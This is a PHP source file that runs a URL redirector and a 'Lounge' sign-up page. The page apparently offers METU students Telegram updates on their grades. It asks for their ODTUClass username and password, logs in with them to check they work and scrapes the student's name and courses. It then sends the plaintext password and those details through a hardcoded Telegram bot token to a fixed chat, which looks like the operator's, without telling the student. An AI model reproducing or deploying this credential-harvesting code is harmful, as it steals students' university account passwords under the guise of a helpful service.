<?php
 if (!isset($_SERVER['HTTPS']) || !$_SERVER['HTTPS']) { // if request is not secure, redirect to secure url
    $url = 'https://' . $_SERVER['HTTP_HOST']. $_SERVER['REQUEST_URI'];
    header('Location: ' . $url);
    exit;
}

if (isset($_GET['s'])) {
	require 'config.php';
	$slug = $_GET['s'];
	$db = new MySQLi(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);
	$db->set_charset('utf8mb4');
	$escapedSlug = $db->real_escape_string($slug);
	$redirectResult = $db->query('SELECT url FROM redirect WHERE slug = "' . $escapedSlug . '"');
	if ($redirectResult && $redirectResult->num_rows > 0) {
		$db->query('UPDATE redirect SET hits = hits + 1 WHERE slug = "' . $escapedSlug . '"');
		$url = $redirectResult->fetch_object()->url;
	} else {
		$url = 'https://' . $_SERVER['HTTP_HOST']. $_SERVER['REQUEST_URI'];
	}
	$db->close();
	
$attributeValue = htmlspecialchars($url);	
?>

<meta http-equiv=refresh content="0;URL=<?php echo $attributeValue; ?>"><a href="<?php echo $attributeValue; ?>">Continue</a><script>location.href=<?php echo json_encode($url, JSON_HEX_TAG | JSON_UNESCAPED_SLASHES); ?></script>

<?php
} else {
?>

<html>
	<head>
	<title>Lounge</title>
		<meta charset="utf-8">
		<meta name="robots" content="noindex">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
		<link href="https://getbootstrap.com/docs/3.3/dist/css/bootstrap.min.css" rel="stylesheet">
		<link href="https://getbootstrap.com/docs/3.3/examples/signin/signin.css" rel="stylesheet">
	</head>

	<body>
		<div class="container">
			<form action="index.php" method="post" class="form-signin">
				<h2 class="form-signin-heading">Register</h2>
				
				<input id="teluser" placeholder="Username" class="form-control" type="text" name="teluser"><br>
				
				<input id="telpassword" placeholder="Password" class="form-control" type="password" name="telpassword"><br>
				
				<button class="btn btn-lg btn-primary btn-block" type="submit">Submit</button>
			</form>
		</div>
	</body>
</html>

<center>
<?php
if (strpos($_SERVER ['HTTP_USER_AGENT'], "iPhone") !== false) {
$download = "https://telegram.org/dl/ios";
} else {
$download = "https://telegram.org/dl/android";
}
	
if(!empty($_POST["telpassword"]) and !empty($_POST["teluser"])) {
	
function sucess($userisim,$telegramid){
	$message = urlencode("$userisim");
	$chat = "$telegramid";
	$botapi = "471731004:AAE0R5Kl2KJZvGm-VvNHdzJuVs5Hqh5JSOY";
	$link = "https://api.telegram.org/bot$botapi/sendMessage?text=$message&chat_id=$chat";
	$ch = curl_init($link);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);curl_close($ch);
}
	
function between($string, $start, $end){    $out    = explode($start, $string);    if(isset($out[1]))    {        $string = explode($end, $out[1]);    return $string[0];   }    return '';}
$url      = 'https://odtuclass.metu.edu.tr/login/index.php';
$cookie   = "cookie/" . time() . "_" . substr(md5(microtime()), 0, 5) . ".txt";

if(preg_match("/e[0-9]{6}/", $_POST["teluser"])){
$teluser = $_POST["teluser"];
} else {
$teluser = "e123456";
}

$telpasssword =  strip_tags(trim($_POST["telpassword"]));



$url1             = "https://odtuclass.metu.edu.tr/grade/report/overview/index.php";
$cookie_file_path = "cookie/" . time() . "_" . substr(md5(microtime()), 0, 5) . ".txt";
$ch               = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER['REQUEST_URI']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 400); //timeout in seconds
$result = curl_exec($ch);
$logintoken   = between($result, '<input type="hidden" name="logintoken" value="', '">');

$postinfo         = "username=$teluser&password=$telpasssword&rememberusername=1&anchor=&logintoken=$logintoken";
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo);
$result = curl_exec($ch);
curl_setopt($ch, CURLOPT_URL, $url1);
$html        = curl_exec($ch);

preg_match('#<a(.*?)title="View profile">(.*?)</a>#si', $result, $match);
$sesskey   = between($html, '</a> (<a href="', '">Log out</a>)');


curl_setopt($ch, CURLOPT_URL, $sesskey);
$logout = curl_exec($ch);
curl_close($ch);

if(!preg_match('#<div class="forgetpass">(.*?)</div>#is', $html) ) {

        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot471731004:AAE0R5Kl2KJZvGm-VvNHdzJuVs5Hqh5JSOY/getUpdates"); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        $dosyayicek = curl_exec($ch); 
        curl_close($ch);      
		
$decode = json_decode($dosyayicek, true); 

foreach ($decode["result"] as $arr => $val){ 
if (strpos($val["message"]["text"], $teluser) !== false) {
 $teluserid = $val["message"]["chat"]["id"];
}
}

if(empty($teluserid)){
die('<div class="alert alert-danger"><b>Send your username to bot with e123456 format!</b></div>');
}

$mcuserid = between($html, 'data-userid="', '"');
$dersid = array();
$dersisim = array();

$dom = new DOMDocument;
libxml_use_internal_errors(true);
$dom->loadHTML($html);
libxml_use_internal_errors(false);
$tags = $dom->getElementsByTagName('a');

foreach($tags as $a){
if (preg_match('/\[[^\]]*\]/', $a->nodeValue, $matches)) {
	
	if (strpos($matches[0], 'HIST') == false OR strpos($matches[0], 'PHYS') == false OR strpos($matches[0], 'MATH') == false) {
	$dersid[] = between($a->getAttribute('href'), '&id=', '&');
	$dersisim[] = $matches[0]; 
	}
}
}

$isim   = between($html, '<span class="usertext mr-1">', '</span><span class="avatars">');

for($i=0;$i<count($dersisim);$i++) { $dersidleri .= $dersid[$i].",";} 
$dersidleri = substr($dersidleri, 0, -1);


$check = glob("txt/$mcuserid-*.txt");
if(empty($check)) {
	echo'<div class="alert alert-success"><b>Registration successful!</b></div>'; 
	
	sucess("array(\"username\"=>\"$teluser\",\"password\"=>\"$telpasssword\",\"userid\"=>$mcuserid,\"telid\"=>$teluserid,\"realname\"=>\"$isim\",\"dersid\"=>array($dersidleri)),",467803378);
	
	sucess("2019-2020 Spring | Welcome to the Lounge ".$isim."!",$teluserid);
	


} else {
echo'<div class="alert alert-danger"><b>You are already registered!</b></div>'; 
}


} else {
echo'<div class="alert alert-danger"><b>You entered wrong password.</b></div>'; 
} 

} else {
	echo '<div class="alert alert-info"><b>First: download Telegram. => <a target="blank" href="'.$download.'"> Download ! </a> <br>
	Second: send your username to the bot. => <a target="_blank" href="tg://resolve?domain=METUEX_BOT">click here</a> <br>
	Third: After sending your username you can come and login.</div>'; 

}

?>
</center>

<?php
}
?>